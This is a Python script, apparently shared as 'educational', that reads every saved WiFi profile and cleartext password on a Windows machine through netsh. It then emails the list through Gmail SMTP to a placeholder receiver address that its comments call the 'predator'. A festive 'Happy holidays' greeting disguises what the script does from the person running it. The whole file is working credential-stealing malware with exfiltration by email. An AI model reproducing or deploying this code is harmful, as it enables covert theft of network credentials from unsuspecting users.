# This python script is solely for educational purpose only
# Everything is under the user's responsibility
# Written at 17/11/2021
# Script:
# create a list of wifi names and passwords
# email the list to the predator / user
# copyright of fiekzz

import subprocess
import smtplib
from email.message import EmailMessage
import numpy as np

print("Happy holidays guys! Wish you all the best!\n")
print("Please wait this might take a while")

# list of wifi names and password
dictionary = []

# run the command netsh wlan show profiles and decode the results in utf-8 decoder
# data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp850').split('\n')
bytesData = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], stdout=subprocess.PIPE)
data = "".join(map(chr, bytesData.stdout)).split('\n')

# put every profiles saved from the pc to a profiles list
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

for i in profiles:
    # run the command to gain the password from the pc to the results
    # results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp850').split('\n')
    bytesResults = subprocess.run(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], stdout=subprocess.PIPE)
    results = "".join(map(chr, bytesResults.stdout)).split('\n')

    for a in results:

        # if the "Key Content" is displayed, thus there may be a password
        if "Key Content" in a:

            # if the content password is null then passwd is null
            # passwd will be assigned to null
            if a.split(":")[1][1:-1] == None:
                passwd = ""
            else:
                # assign the password to the passwd
                passwd = a.split(":")[1][1:-1]

        # if the "Key Index" is displayed, thus there will be no password
        # "Key Index" mostly for the enterprise wifi
        # passwd will be assigned to null
        elif "Key Index" in a:
            passwd = ""

    # copy the wifi name and password to the dictionary
    dictionary.append(i)
    dictionary.append(passwd)

# determine the length of the dictionary to change the list to 2D list
# change the shape of the list from 1D to 2D list
length = int(len(dictionary) / 2)
string = np.array(dictionary).reshape(length, 2)

# assign the list to string in wifi
wifi = str(string)

# the function will send the wifi string to the predator / user
def email_alert(subject, body, to):

    # assign EmailMessage() function to msg
    msg = EmailMessage()
    # assign the string to the body of email
    msg.set_content(body)
    # assign title or subject to the subject of the email
    msg['subject'] = subject
    # determine the receiver of the email
    msg['to'] = to

    # Create a user
    # Put your gmail account and password
    user = "sender@gmail.com"

    # assign the sender to the user
    msg['from'] = user
    # Put your password in the password section
    # **NOTE**
    # This is not your regular gmail password
    # To gain the password you must active the 2 factor authentication
    # Activate the 'Other' in the app password
    # Gain the generated password in the section
    password = "senderpassword"

    # create smtp server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # connect securely to server
    server.starttls()
    # login using assigned user and password
    server.login(user, password)
    # send email
    server.send_message(msg)
    # quit the email server
    server.quit()

# email function call
email_alert("wlan0test", wifi, "receiver@gmail.com")
